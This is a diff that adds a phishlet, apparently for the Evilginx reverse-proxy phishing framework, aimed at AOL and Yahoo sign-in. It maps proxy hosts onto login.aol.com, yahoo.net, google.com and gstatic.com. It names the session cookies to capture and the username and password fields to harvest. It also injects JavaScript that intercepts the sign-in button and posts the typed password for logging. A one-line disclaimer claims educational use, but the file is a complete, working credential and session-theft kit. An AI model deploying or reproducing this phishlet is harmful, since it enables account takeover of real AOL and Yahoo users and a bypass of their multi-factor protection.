@@ -1,0 +1,122 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET. 3p-geo.yahoo.com
+author: '@ThySec'
+min_ver: '2.9.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'aol.com', session: true, is_landing: true}
+  - {phish_sub: 'api-login', orig_sub: 'api.login', domain: 'aol.com', session: false, is_landing: false}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'aol.com', session: true, is_landing: false}
+  - {phish_sub: '3p-geo', orig_sub: '3p-geo', domain: 'yahoo.com', session: false, is_landing: false}
+  - {phish_sub: 'geo', orig_sub: 'geo', domain: 'yahoo.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: true, is_landing: false}
+  - {phish_sub: 'oidc-www', orig_sub: 'oidc.www', domain: 'aol.com', session: true, is_landing: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'aol.com', session: true, is_landing: false}
+  - {phish_sub: 'oidc-mail', orig_sub: 'oidc.mail', domain: 'aol.com', session: true, is_landing: false}
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'auth', orig_sub: 'login', domain: 'yahoo.net', session: true, is_landing: false, auto_filter: false}
+  # - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ww1', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ww2', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}/account/challenge/recaptcha?lang=en-gb&intl=uk&done=https%3A%2F%2Fwww.{domain}%2F&sessionIndex=QQ--&acrumb=pXf4oPZb&display=login&authMechanism=primary', replace: 'https://{hostname}/account/challenge/recaptcha?lang=en-gb&intl=uk&done=https%3A%2F%2Fwww.{domain}%2F&sessionIndex=QQ--&acrumb=pXf4oPZb&display=login&authMechanism=primary', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https://{hostname}/account/challenge/password?lang=en-gb&intl=uk&done=https%3A%2F%2Fwww.{domain}%2F&acrumb=pXf4oPZb&display=login&authMechanism=primary&sessionIndex=QQ--&e=true&pcn=password', replace: 'https://{hostname}/account/challenge/password?lang=en-gb&intl=uk&done=https%3A%2F%2Fwww.{domain}%2F&acrumb=pXf4oPZb&display=login&authMechanism=primary&sessionIndex=QQ--&e=true&pcn=password', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2{hostname_regexp}/', replace: 'https%3A%2F%2{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: 'https%3A%2F%2F{hostname_regexp}/', replace: 'https%3A%2F%2F{hostname_regexp}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'csp.yahoo.com',   orig_sub: '', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.aol.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/recaptcha/enterprise.js', replace: 'https://{hostname}/recaptcha/enterprise.js', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'aol.com', search: '{domain}', replace: '{domain}', mimes: ['text/html']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.aol.com', orig_sub: '', domain: 'aol.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.aol.com'
+    keys: ['OTH', 'A1S', '.*,regexp']
+  - domain: '.login.aol.com'
+    keys: ['T', 'Y', 'AS', '.*,regexp']
+  - domain: '.yahoo.com'
+    keys: ['T','Y']
+  - domain: '.www.aol.com'
+    keys: ['OTHP', '.*,regexp']    
+
+auth_urls:
+  - '/account/challenge/password'
+  
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Passwyd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.aol.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ["login.aol.com"]
+    trigger_paths: ["/account/challenge/password", "/password"]
+    trigger_params: []
+    script: |
+      let start = setInterval(function() {
+           if (document.querySelectorAll('input[id=login-passwd]').length) {
+              clearInterval(start);
+              let subButton = document.getElementById('login-signin');
+              let parent = subButton.parentElement
+              async function a(ev) {
+                  ev.stopPropagation();
+                  ev.preventDefault();
+                  if (!subButton.disabled) {
+                      var password = document.getElementsByName("password")[0].value;
+                      await fetch('/account/challenge/password', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: "Passwyd=" + encodeURIComponent(password)});
+                      parent.removeEventListener('click', a, true);
+                      ev.target.click()
+                  }
+              }
+              parent.addEventListener("click", a, true);
+              new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type == "attributes" && mutation.attributeName == "disabled" && mutation.target.disabled == true) {
+                        parent.removeEventListener('click', a, true);
+                        parent.addEventListener("click", a, true);
+                    }
+                });
+              }).observe(subButton, {
+                attributes: true //configure it to listen to attribute changes
+              });
+          }
+        }, 2000);
+
